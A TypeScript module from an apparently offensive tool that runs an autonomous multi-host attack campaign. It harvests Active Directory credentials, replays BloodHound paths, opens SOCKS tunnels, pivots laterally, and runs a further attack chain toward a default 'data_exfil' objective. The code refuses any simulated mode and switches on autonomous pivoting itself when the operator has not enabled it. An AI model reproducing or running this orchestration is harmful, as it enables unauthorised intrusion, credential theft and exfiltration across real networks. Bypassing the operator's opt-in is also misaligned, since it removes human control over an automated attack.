/**
 * @module campaign_loop
 * Tier-1 autonomous multi-host campaign — cred→harvest→BloodHound→pivot→tunnel loop.
 */
import type { AttackSurfaceGraph } from "./attack_surface.ts"
import { CredentialGraph } from "./credential_graph.ts"
import { runAutonomousPivot, type PivotObjective, objectiveMet } from "./autonomous_pivot.ts"
import { replayCredentialGraphWithBloodHound } from "./pivot_replay.ts"
import { createPortForwarderAsync } from "./pivot_tunnel.ts"
import { EngagementMemory } from "./engagement_memory.ts"
import { resolveLiveMode } from "./exec_options.ts"
import { orchestrateSegmentTunnels } from "./segment_tunnel_orchestrator.ts"
import { runAresAutoChain, harvestAdCredentials } from "./ares/_chain.ts"

export interface CampaignObjective {
  type: PivotObjective
  maxHosts: number
  maxSteps: number
}

export interface CampaignLoopResult {
  phases: Array<{ phase: string; success: boolean; detail: string }>
  hostsCompromised: string[]
  tunnels: Array<{ method: string; localPort: number }>
  objectiveMet: boolean
  summary: string
}

function isTier1Autonomous(): boolean {
  return process.env.OURMINE_TIER1 === "1"
    || process.env.OURMINE_TIER1 === "true"
    || process.env.OURMINE_LAB_AUTONOMOUS === "1"
    || process.env.OURMINE_AUTONOMOUS_PIVOT === "1"
}

export async function runCampaignLoop(opts: {
  graph: AttackSurfaceGraph
  credGraph: CredentialGraph
  target: string
  live: boolean
  objective?: CampaignObjective
  engagementMem?: EngagementMemory
}): Promise<CampaignLoopResult> {
  const phases: CampaignLoopResult["phases"] = []
  const hosts = new Set<string>()
  const tunnels: CampaignLoopResult["tunnels"] = []
  const objective = opts.objective ?? { type: "data_exfil" as PivotObjective, maxHosts: 10, maxSteps: 15 }
  const live = resolveLiveMode({ live: opts.live })

  if (!live) {
    return {
      phases: [{ phase: "blocked", success: false, detail: "live execution required — no simulation" }],
      hostsCompromised: [],
      tunnels: [],
      objectiveMet: false,
      summary: "Campaign loop requires live mode (OURMINE_TIER1=1, --live, or Kali)",
    }
  }

  if (!isTier1Autonomous()) {
    process.env.OURMINE_AUTONOMOUS_PIVOT = "1"
  }

  try {
    const harvest = await harvestAdCredentials({
      target: opts.target,
      domain: process.env.OURMINE_AD_DOMAIN,
      live: opts.live,
      credGraph: opts.credGraph,
    })
    phases.push({
      phase: "cred_harvest",
      success: harvest.phases.some((p) => p.success),
      detail: harvest.phases.map((p) => p.summary).join("; ").slice(0, 200),
    })
  } catch (err) {
    phases.push({ phase: "cred_harvest", success: false, detail: String((err as Error).message).slice(0, 120) })
  }

  try {
    const isLab = process.env.OURMINE_LAB_AUTONOMOUS === "1" || process.env.OURMINE_TIER1 === "1"
    const bh = await replayCredentialGraphWithBloodHound(
      opts.credGraph,
      [opts.target, ...opts.credGraph.bloodhoundTargetHosts()],
      { live: opts.live, skipCollection: isLab || opts.credGraph.getBloodHoundPaths().length > 0 },
    )
    phases.push({
      phase: "bloodhound_replay",
      success: bh.replays.some((r) => r.success),
      detail: `${bh.paths.length} paths, ${bh.replays.filter((r) => r.success).length} successful replays`,
    })
  } catch (err) {
    phases.push({ phase: "bloodhound_replay", success: false, detail: String((err as Error).message).slice(0, 120) })
  }

  const assets = Object.keys((opts.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})
  const tunnelOrchestration = await orchestrateSegmentTunnels(opts.graph, { live: true })
  for (const t of tunnelOrchestration.tunnels) {
    if (t.live) tunnels.push({ method: t.method, localPort: t.localPort })
  }
  if (tunnelOrchestration.tunnels.length) {
    phases.push({
      phase: "segment_tunnel_orchestration",
      success: tunnelOrchestration.tunnels.some((t) => t.live),
      detail: tunnelOrchestration.summary,
    })
  }

  if (assets.length > 1 && tunnels.length === 0) {
    const tunnel = await createPortForwarderAsync(
      { type: "socks5", localPort: 1180 + assets.length, remoteHost: assets[1] ?? opts.target, remotePort: 22 },
      true,
    )
    if (tunnel.status.startsWith("Listening")) {
      tunnels.push({ method: "socks5", localPort: tunnel.localPort ?? 1180 })
      phases.push({ phase: "segment_tunnel", success: true, detail: `SOCKS pivot toward ${assets[1]}` })
    }
  }

  const pivot = await runAutonomousPivot({
    graph: opts.graph,
    credGraph: opts.credGraph,
    live: true,
    objective: objective.type,
    extraHosts: assets,
  })
  for (const h of pivot.hostsGained) {
    hosts.add(h)
    opts.engagementMem?.recordHost(h)
  }
  phases.push({
    phase: "autonomous_pivot",
    success: pivot.hostsGained.length > 0,
    detail: pivot.summary,
  })

  try {
    const chain = await runAresAutoChain({
      target: opts.target,
      domain: process.env.OURMINE_AD_DOMAIN,
      live: opts.live,
      credGraph: opts.credGraph,
      skipHarvest: true,
    })
    phases.push({
      phase: "ares_auto_chain",
      success: chain.phases.some((p) => p.success && !p.skipped),
      detail: chain.summary,
    })
  } catch (err) {
    phases.push({ phase: "ares_auto_chain", success: false, detail: String((err as Error).message).slice(0, 120) })
  }

  opts.credGraph.save()
  const met = objectiveMet(objective.type, [...hosts], opts.credGraph, opts.graph)

  return {
    phases,
    hostsCompromised: [...hosts],
    tunnels,
    objectiveMet: met,
    summary: met
      ? `Campaign objective '${objective.type}' met with ${hosts.size} host(s)`
      : `Campaign loop complete — ${hosts.size} host(s), ${phases.filter((p) => p.success).length}/${phases.length} phases ok`,
  }
}

export default { runCampaignLoop, isTier1Autonomous }
